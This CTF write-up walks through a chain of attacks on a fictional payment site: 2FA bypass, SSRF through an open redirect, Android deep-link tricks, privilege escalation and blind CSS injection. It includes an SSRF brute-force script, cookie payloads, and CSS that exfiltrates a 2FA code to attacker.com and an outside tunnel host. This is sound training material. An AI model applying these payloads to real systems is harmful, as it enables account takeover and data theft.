H1-2006 CTF Writeup\n\nAfter playing quite an amount of CTFs till date, I can really say that this was one of the extraordinary ones and it is quite visible once you consider the magnitude of logical deductions it required to follow the right path and not the rabbit holes and the effort taken in arranging the stable infrastructure required. Thanks, Hackerone, and the Authors for amazing 24 hours of intellectual satisfaction which was much needed in the lockdown. It felt good to be in the [Top 5s to crack this](https://twitter.com/adamtlangley/status/1266983209994199040?s=20). \n\nAn Unorthodox CTF requires an Unorthodox writeup hence it will be a summarised walkthrough of my thought process. \n\nFor the people who actively tried and could not solve till the end, an illustrative TL;DR will be fine:\n\n{F857813}\n\nIn a nutshell, Solution has 8 steps:\n\n## Index\n1. Initial Recon\n2. Exposed .git directory\n3. Login 2FA Bypass\n4. Server-Side Request Forgery\n5. Android Challenges\n6. API + OSINT\n7. Privilege Escalation\n8. Stealing Payment 2FA Code using CSS\n\n## 1. Initial Recon\n\nAs soon as hacker sees the **\\*wildcard**,\n\n{F857816}\n\nWe do Recon \u0026 [Subfinder](https://github.com/projectdiscovery/subfinder) yeilds:\n\n|SubDomains| Notes Taken | \n|--------| -------- | \n| bountypay.h1ctf.com | Static Home Page.| \n| app.bountypay.h1ctf.com | For Customers Use, Marten is one of em.|\n| staff.bountypay.h1ctf.com| For BountyPay employees probably.|\n| api.bountypay.h1ctf.com| Hmm, The API service for above two. Has **Open Redirect**, Might be for chaining later🤔|\n| software.bountypay.h1ctf.com | Interesting one, Can't be accessed directly due to IP whitelist, I smell **SSRF**.|\n\nIn the text ahead, I will address the subdomains as separate entities (Ex. app.bountypay.h1ctf.com will be just `App`)\n\n## 2. Exposed .git directory\n\nAfter trying usual bugs of Auth Bypass in attempts to login into App and Staff, we are just left with more content discovery, and doing usual [dirsearch](https://github.com/maurosoria/dirsearch):\n\n{F857821}\n\nWe find that some part of the .git directory is exposed on App for us to analyze. Looking into these files, we get a reference to a public Github Repo of BountyPay([bounty-pay-code/request-logger](https://github.com/bounty-pay-code/request-logger.git)). This repo leaks a path([/bp_web_trace.log](https://app.bountypay.h1ctf.com/bp_web_trace.log)) where logs are stored for the App. The logs contain login credentials of a BountyPay Customer Brian Oliver(**brian.oliver:V7h0inzX**). Now we have a session on App I guess.\n\n## 3. Login 2FA Bypass\n\nNo No, Not so fast! BountyPay is secure. They have Login 2FA to save their customers 🙃. The App sends a 2FA code to the customer’s phone.\n\nThe POST request for submitting 2FA code had 4 parameters. \nUsername, Password, **Challenge** \u0026 **Challenge_Answer**.\n\nThe Challenge_Answer param is supposed to be the 2FA code. In the very first attempt after verifying that the weird Challenge Param is of length 32, I sort of guessed that this is **md5 of answer** and as the App is taking this from client-side, we might be able to submit **our own challenge according to our own answer** and fool the App, and BOOM. It just worked. Now we are logged In with Brian's Creds on the App.\n\n## 4. Server Side Request Forgery\n\nPOST-Succesfull Auth, App creates a Base64 encoded JSON cookie: `token`,  which after decoding looks like:\n\n```json\n{\"account_id\":\"F8gHiqSdpK\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}\n```\n\nAfter fuzzing both params, we come to know that App is using `hash` for the session and `account_id` for creating URI for the server-side request to API endpoint for getting the Bounty Payment data for Brian's account_id `F8gHiqSdpK`(App very generously gives away the endpoint in the HTTP response of /statements?month=05\u0026year=2020)\n\n(https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=05\u0026year=2020) \n*Note: Direct access to this endpoint is not possible, there is some secret token added by App.* \n\nRemember the notes from Recon? Software is not accessible due to whitelist and Api has Open Redirect.\n\nTo reach the Software we need SSRF and to get that, we have:\n1. Injection point(/api/accounts/`account_id`) in URI to Api\n2. OpenRedirect(/redirect?url=) on Api to make the request go to wherever we want.\n\nWhat we dont have yet is traversal in URI to reach /redirect from /api/account/account_id and `account_id=../../redirect?url=software# might just work`.\n\nAfter testing the theory, it just worked! \n```json\n{\"account_id\":\"../../redirect/?url=https://software.bountypay.h1ctf.com/#\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}\n```\n**We have full-blown SSRF now and we can reach the Software. 💥** \n\n{F857828}\n\n\n\nBut there is nothing interesting on it. 😕 The HTML on Software only had one standard Login form with POST method:\n\n```html\n\u003ch1 style=\"text-align: center\"\u003eSoftware Storage\u003c/h1\u003e\n\u003cform method=\"post\" action=\"/\"\u003e\n  \u003cdiv class=\"panel panel-default\" style=\"margin-top:50px\"\u003e\n     \u003cdiv class=\"panel-heading\"\u003eLogin\u003c/div\u003e\n     \u003cdiv class=\"panel-body\"\u003e\n        \u003cdiv style=\"margin-top:7px\"\u003e\n           \u003clabel\u003eUsername:\u003c/label\u003e\n        \u003c/div\u003e\n        \u003cdiv\u003e\n           \u003cinput name=\"username\" class=\"form-control\"\u003e\n        \u003c/div\u003e\n        \u003cdiv style=\"margin-top:7px\"\u003e\n           \u003clabel\u003ePassword:\u003c/label\u003e\n        \u003c/div\u003e\n        \u003cdiv\u003e\n           \u003cinput name=\"password\" type=\"password\" class=\"form-control\"\u003e\n        \u003c/div\u003e\n     \u003c/div\u003e\n  \u003c/div\u003e\n  \u003cinput type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\"\u003e\n\u003c/form\u003e\n```\n\nWe just have GET SSRF and we can't issue POST SSRF, After trying Scenarios like CRLF, etc. and not getting anything, this SSRF felt almost useless for quite some time. But I was sure that it is meant to hit Software in the scenario. I learned from the initial Login step on App that, If we don’t have Hint to move forward, all we can do is content discovery 🙂. Hence wrote a small python script to do Directory brute-force on Software using this SSRF.\n\n```python\nimport requests\nimport base64\n\nburp0_url = \"https://app.bountypay.h1ctf.com:443/statements?month=04\u0026year=2020\"\n\ndirs = open(\"common-directories.txt\", \"r\")\nfor d in dirs:\n\ttoken = '{\"account_id\":\"../../redirect/?url=https://software.bountypay.h1ctf.com/'+d+'#\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}'\n \ttoken = base64.b64encode(token)\n\tburp0_cookies = {\"token\": token}\n\tdata = requests.get(burp0_url,cookies=burp0_cookies).text\n\tprint data\n```\n\nAnd on https://software.bountypay.h1ctf.com/uploads we get:\n\n```html\n\u003chtml\u003e\n   \u003chead\u003e\n      \u003ctitle\u003eIndex of /uploads/\u003c/title\u003e\n   \u003c/head\u003e\n   \u003cbody bgcolor=\"white\"\u003e\n      \u003ch1\u003eIndex of /uploads/\u003c/h1\u003e\n      \u003chr\u003e\n      \u003cpre\u003e\u003ca href=\"../\"\u003e../\u003c/a\u003e\u003ca href=\"/uploads/BountyPay.apk\"\u003eBountyPay.apk\u003c/a\u003e                                        20-Apr-2020 11:264043701\u003c/pre\u003e\n      \u003chr\u003e\n   \u003c/body\u003e\n\u003c/html\u003e\n```\n\nA link to an Android APK! https://software.bountypay.h1ctf.com/uploads/BountyPay.apk which is directly accessible  😁. Now we download this APK and start analyzing. Turns out it is corrupted. I hackily tried to Fix the corruption, At some point, I even considered to fix this by reading all about PZip. Some cool references:\n1. https://fadec0d3.blogspot.com/2017/04/plaidctf-2017-zipper-50.html\n2. https://git.zx2c4.com/BruteZip/about/\n\nBut, After banging my head for some hours, I got to know that I was one of the **unfortunates to reach this step too early**, As it was not intentional to give corrupted APK. Thanks to [@Ziot](https://twitter.com/bbuerhaus) on Hacker101 discord for letting me know that they have fixed the issue and later nahamsec also [tweeted](https://twitter.com/NahamSec/status/1266586955849953281) out about it. But I would have definitely played for hours with corrupted APK if Ziot had not notified.\n\n\n## 5. Android Challenges\n\nReversing and analyzing the BountyPay App's `AndroidManifest.xml` and Source Code, We get two know that there are 5 activities:\n\n\n| Activity | Purpose  |\n| -------- | -------- |\n| MainActivity | A form that takes Twitter Handle and Username for analytics. |\n| PartOneActivity | The Activity code Checks if it was opened through DeepLink URI having scheme = **`one`** and host = **`part`** and has parameter **`start`** = **`PartTwoActivity`**,  If yes, then it stores that PartOne is solved and starts `PartTwoActivity`. ADB command to achieve above: **$ adb shell am start -d one://part?start=PartTwoActivity**  |\n| PartTwoActivity | Similary this activty too requires a deeplink to solve: **$ adb shell am start -d \"two://part?two=light\\\\\u0026switch=on\"**. After that, it makes a text Field and submit button visible. When we submit this form, it compares the String Value from text field with the one it fetched from DataSnapshot. If it is equal then we solve this step and it fires `PartThreeActivity`. We get this value to be **`X-Token`**, I used frida hook to **dump the Strings which are being compared** using handy [frida-snippet](https://github.com/iddoeldor/frida-snippets/blob/master/scripts/log_string_builders_and_string_compare.js). **$ frida -U -f bounty.pay -l ./frida-snippet.js --no-paus** {F857846}\n|\n| PartThreeActivity | This step too expects us to deduce the DeepLink from SourceCode analysis. It turn out to be: **\\$ adb shell am start -d \"three://part?three=UGFydFRocmVlQWN0aXZpdHk=\\\u0026\u003c/br\u003eswitch=b24=\\\u0026header=X-Token\"** where params are, `three = base64(\"PartThreeActivity\")`, `switch = base64(\"on\")` \\\u0026 `header=X-Token`. It then makes a form visible which expects us to submit a valid Hash, we can again dump it out with same `frida-snippet` as in step two. Hash: {F857847} After we submit this hash, App fires a POST request and leaks the Host \\\u0026 Header in logs: {F857848}|\n| CongratsActivity | It congratulates after solving above 3 steps in sequence! Now we have the **token!** which we did not ealier. This `X-Token` can be used to **directly access the Api**.|\n\n## 6. API + OSINT\n\nNow, we have a hint to work on Api with given `X-token`. From `/statements` endpoint on App we know that Api hosts a REST api on `/api/*`. With this much of little information, a hacker always is left with nothing to do other than more content discovery 🙂. I fuzzed for API docs/more endpoints on `/*` and `/api/*` on `api.bountypay.h1ctf.com` in a hope to see some hidden endpoints and yep, we do get the hit on `/api/staff`!\n\n**\\$ wfuzz --hc 404 -H \"X-Token: 8e9998ee3137ca9ade8f372739f062c1\" -w wordlist/general/common.txt https://api.bountypay.h1ctf.com/api/FUZZ**\n\nThis confirms that we are on the right path! 😪\n\nhttps://api.bountypay.h1ctf.com/api/staff gives us something interesting:\n\n{F857854}\n\nAnd standard REST Api tests of finding more valid METHODS, Parameters on this endpoint yields:\n\n{F857855}\n\nNow we need to find what parameter we are missing and from where it is missing (GET/POST/Content-Type?). \n\nBy REST Api constructs we easily can assume that if `GET /api/staff` gets staff array, then `POST /api/staff` must be used for Creating new staff object. So let’s pass it the parameters related to staff. After some time of fuzzing and passing parameters like `name`, `username`, `staff_id` in GET queries \\\u0026 POST body with different content types, we end up with:\n\n{F857856}\n\nSo this indeed is how a valid staff creation POST request looks like! Now we just need to create one account for ourselves. \n\nBut unfortunately, nearly 1-2 hours of fuzzing did not result in anything to move forward. At this point, I had tried multiple scenarios from the account takeover scene to weird obscure fuzzing to create a valid staff account. \n**Turns out, I was again one of those few unfortunates who reached this stage too early!** The hint for this next step was given just after I solved this step.\n\nAfter too much of cosmic fuzzing, I started thinking maybe Fuzzing is not the way forward, like Git repo \u0026 Android challenges, there is a another dimension than Web to it. Maybe of OSINT. A scenario like staff leaking credentials on public forum is possible.\nSo I searched for terms like `\"BountyPay\", \"staff_id\", \"Sam Jenkins\", \"Brian Oliver\", \"STF:KE624RQ2T9\"` on Github, Pastebin, Linkedin, Facebook and at Last on Twitter! and found this tweet(later Hackerone retweeted it to give hint 😬):\n\n{F857859}\n\nWe find Sandra in BountyPay HQ's following accounts and in her account we find her [uploaded photo](https://twitter.com/SandraA76708114/status/1258693001964068864) of Employee ID card containing what we need, the precious `staff_id=STF:8FJ3KFISL3`\n\n{F857860}\n\n\nNow we have an account of newly joined employee Sandra on Staff.\n```\nsandra.allison : s%3D8qB8zEpMnc*xsz7Yp5\n```\n\nThis marked my 16th hour of continuous hacking on this CTF, after this, I went to sleep 😪\n\n## 7. Privilege Escalation\n\nLooking around on the Staff App through Sandra's account, We notice some fishy things:\n\n1. `Template` parameter is client-controlled.\n2. A weird way of updating Profile image through CSS(`css/style.css`) classes by having inline images as base64 encoding served through Data URI.\n3. There is an `admin` role to some staff accounts.\n4. `Report This Page` feature for admin to visit and see if there is something wrong.\n5. And the most interesting:\n\n```javascript\n$(\".upgradeToAdmin\").click(function() {\n    let t = $('input[name=\"username\"]').val();\n    $.get(\"/admin/upgrade?username=\" + t, function() {\n        alert(\"User Upgraded to Admin\")\n    })\n}), $(\".tab\").click(function() {\n    return $(\".tab\").removeClass(\"active\"), $(this).addClass(\"active\"), $(\"div.content\").addClass(\"hidden\"), $(\"div.content-\" + $(this).attr(\"data-target\")).removeClass(\"hidden\"), !1\n}), $(\".sendReport\").click(function() {\n    $.get(\"/admin/report?url=\" + url, function() {\n        alert(\"Report sent to admin team\")\n    }), $(\"#myModal\").modal(\"hide\")\n}), document.location.hash.length \u003e 0 \u0026\u0026 (\"#tab1\" === document.location.hash \u0026\u0026 $(\".tab1\").trigger(\"click\"), \"#tab2\" === document.location.hash \u0026\u0026 $(\".tab2\").trigger(\"click\"), \"#tab3\" === document.location.hash \u0026\u0026 $(\".tab3\").trigger(\"click\"), \"#tab4\" === document.location.hash \u0026\u0026 $(\".tab4\").trigger(\"click\"));\n```\n\nThe `/js/website.js` Javascript File.\n\nIt has an endpoint `GET /admin/upgrade?username=` which was for upgrading staff to an admin. But only upon admins invoking, it would work. Ohk, so we do have a CSRF-ish feature of `Report This Page` to admin. So lets report **/admin/upgrade?username=sandra.allision**\n\nBut the feature has security enabled!\n`Pages in the /admin directory will be ignored for security`\n\nAfter following every rabbit hole of bypassing this feature I gave up on it and started to look for something else and the last line of JS file caught my eye.\n\n```javascript\n(\"#tab1\" === document.location.hash \u0026\u0026 $(\".tab1\").trigger(\"click\"), ..\n```\n\nThis is almost useless in the app’s context, But it does one very interesting thing, and i.e. it triggers click event.\n\nSo if `#tab2` is in the URL, all elements with class tab2 will get their click event triggered. And what if, one of that element has class `upgradeToAdmin`? Yep the click handler in our JS will fire the `GET /admin/upgrade?username=`. We also have a way to control CSS of elements through the `Update avatar feature` which takes an avatar class from the client-side. \n\nSo `profile_avatar=tab1 upgradeToAdmin` and `#tab1` fragment in URI will trigger the ajax. But we want this to be triggered by admin. We need to report the page to admin where our injected classes are getting reflected? And we do have a unique and relevant page of tickets `/?template=ticket\u0026ticket_id=3582` where our classes are Reflected in our avatar element 🔥 So, Reporting **/?template=ticket\u0026ticket_id=3582#tab1** with **profile_avatar=tab1+upgradeToAdmin** will do the trick!\n\nBut we are still Just missing one thing of the puzzle.\n\n```javascript\nlet t = $('input[name=\"username\"]').val();\n    $.get(\"/admin/upgrade?username=\" + t, function() {\n```\n\nwe still don't have a page to report on which our CSS classes are reflected as well as has an input element with name attribute `username` \u0026 value set to `sandra.allison` 😢 \n\nThere were two possibilities, either there is HTMLi in the username or we have to use the Login template. The later seemed impossible at the moment so followed a bit of rabbit hole. But the use of the `template` parameter in query was itchy, it must have some use in CTF or else one could easily develop an app UI without such parameter.\n\nI thought, What If we could load two templates(Login \u0026 Ticket) simultaneously with this param, and literally laughed 😆 But when I fuzzed the template parameter, I was shocked and ecstatic. literally. We can load multiple templates in one page indeed 🤯\n\n**/?template\\[0\\]=login\\\u0026template\\[1\\]=ticket\u0026ticket_id=3582#tab1**\n\n{F857864}\n\n\nIt only not loaded two templates, It also respected `ticket_id` parameter. This definitely showed me that this is not a rabbit hole! Now as I was confident about my partial exploit URL to report to Admin, We still need value populated in input tag as `sandra.allison`. It was very easy to deduce that we are missing something in our URL, a query parameter probably that will populate input tag, a fair guess is `username` in the query. And yes! Application reflects it back into Login template in attribute `value`.\n\nFinal Exploit:\n\n**/admin/report?url=** *Base64*( **?template[0]=login\u0026username=sandra.allison\u0026template[1]=ticket\u0026ticket_id=3582#\ntab1** )\n\nWe report it and Sandra is now Admin! 👸\n\nThis Step was my favorite step in the CTF 🧠. The thing I liked was the components(Js \u0026 CSS) involved in solution were not just there for CTF, it was actually a working code and yet it gave us Privilege Escalation exploit.\n\nAfter becoming admin, we get to know that BountyPay's admins basically can see customers passwords in plaintext 👀, [@Hackerone](https://twitter.com/Hacker0x01/status/1266454022124376064) could have just contacted BountyPay support instead of declaring CTF to get Marten's credentials (**marten.mickos : h\\\u0026H5wy2Lggj\\*kKn4OD\u0026Ype**) but where's the fun in that 🙂\n\n{F857869}\n\n\n## 8. Stealing Payment 2FA Code using CSS\n\nWe Login with these creds on App, Again bypassing the Login 2FA with the trick from step 2, Get the May 2020's bounties, Click Pay, and ..\n\n{F857870}\n\n\nAnother 2FA challenge! 😨\n\nThis time the implementation was different,  First it asked us to send the 2FA challenge code, Then sent a POST request,\n\n{F857872}\n\nSeems like It's taking the URL of a stylesheet which is used for styling the 2FA code page. To just confirm that if it can be changed to our controlled CSS and the execution context we are in:\n\n{F857873}\n\nNo, Problem. ⚔️ We do have the Awesome research [The Sexy Assassin - Tactical Exploitation using CSS](https://docs.google.com/viewer?url=www.businessinfo.co.uk/labs/talk/The_Sexy_Assassin.ppt) from legendary Gareth Heyes, David Lindsay, and Eduardo Vela. TL;DR, We can exfiltrate the data from the 2FA page sent to Marten if some conditions are met. Attack Methodology from the above research:\n\n### CSS can Compute!\nHow:\n```cs\nelement:condition{\n    action;\n}\n```\nSo, a CSS payload like:\n\n```css\ninput[value*=\"secret\"]{} {\n    background-image:url(\"https://attacker.com/?value_contains=secret\");\n}\n```\nwill successfully exfiltrate the information that one of the input tag on the HTML page contains value `secret` somewhere. In this way, we can use [CSS Attribute Selectors](https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors) for our exfiltration.\n\nSo let's go step by step to deduce what's on the marten’s payment 2FA page:\n\n**1. What elements?**\n```css\ninput {\n\tbackground-image:url(\"https://tunnel.shoebpatel.com/?input\");\n}\n\na {\n\tbackground-image:url(\"https://tunnel.shoebpatel.com/?a\");\n}\n\np {\n\tbackground-image:url(\"https://tunnel.shoebpatel.com/?p\");\n}\n\ndiv {\n\tbackground-image:url(\"https://tunnel.shoebpatel.com/?div\");\n}\n```\n\nwe get the \n```shell\n\"GET /?div HTTP/1.1\" 200 -\n\"GET /?input HTTP/1.1\" 200 -\n```\nOk, so we do have \\\u003cinput\\\u003e tags to get the data out of em with payload like:\n```css\ninput[value^=\"s\"] {\n\tbackground-image:url(\"https://tunnel.shoebpatel.com/?s\");\n}\n```\n\nBut as this is a **Blind CSS injection** scenario, we can't use classic techniques of exfiltrating the multi-length values, which require the vulnerable page to be iframe-able.* [Reference.](https://curesec.com/blog/article/blog/Reading-Data-via-CSS-Injection-180.html)\n\nThis leaves us with only one possibility that either the 2FA code is of length one(unlikely) or the challenge author has put code in multiple input tags with each character in one of them!\n\n**2. How many \\\u003cinput\\\u003es?**\nTo get the idea of how many tags are there, we can use the [:nth-of-type](https://developer.mozilla.org/en-US/docs/Web/CSS/:nth-of-type) CSS pseudo-class:\n\n```css\n/* Selects every fourth \u003cinput\u003e element with value \"s\" \n   among any group of siblings */\n   \ninput[value=\"s\"]:nth-of-type(4){\n    background-image:url(\"https://tunnel.shoebpatel.com/?its-4th-child\");\n}\n```\n\nThis will only fire if there are **4 consecutive or more** input tags in a parent element.\n\nWe find out that there are **7!**\n\nSo we can picturize the 2FA code page as following HTML:\n\n```html\n\u003chtml\u003e\n   \u003cbody\u003e\n      \u003cdiv\u003e\n         \u003cinput value=\"1\"\u003e\n         \u003cinput value=\"2\"\u003e\n         \u003cinput value=\"3\"\u003e\n         \u003cinput value=\"4\"\u003e\n         \u003cinput value=\"5\"\u003e\n         \u003cinput value=\"6\"\u003e\n         \u003cinput value=\"7\"\u003e\n      \u003c/div\u003e\n   \u003c/body\u003e\n\u003c/html\u003e\n```\n\nSo wrote a quick python script from above observations that generates payload CSS file which will exfiltrate the values from all of \u003cinput\u003e tags at once and will tell us the sequence of their occurrence too.\n\n```python\n# $ python ./css_exp.py\n\n#2FA gotta be Alphanumeric\nalpha_num = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\"\nexploit = \"\"\n\n#For each of 7 input tags\nfor pos in range(1, 8):\n\tpos = str(pos)\n\t#For each alpha numeric character\n\tfor char in alpha_num:\n\t\texploit += '''input[value=\"'''+char+'''\"]:nth-of-type('''+pos+'''){\n    background-image:url(\"https://tunnel.shoebpatel.com/?position='''+pos+'''\u0026char='''+char+'''\");\n}\\n'''\n\n\nwith open(\"2fa-exploit.css\", \"w\") as file:\n\tfile.write(exploit)\n```\n\nAs soon as we send our `2fa-exploit.css`, we get 7 hits:\n\n{F857874}\n\nAssembling them in sequence gives us the 2FA code: **RT8i1EC** \n\nAnd, Pwned! 💣\n\n{F857875}\n\n\nWe finally get the message that we completed the challenge and the PoC Flag🚩:\n**\\^FLAG\\^736c635d8842751b8aafa556154eb9f3\\$FLAG\\$** 🤘\n\n## The End\n\nThanks for reading, I tried as much as I could to make this a short read without missing details and the rabbit holes that I followed. I wanted to showcase all of my depth-first approaches but at the time of writing this up, already some days have passed and I forgot some of them.
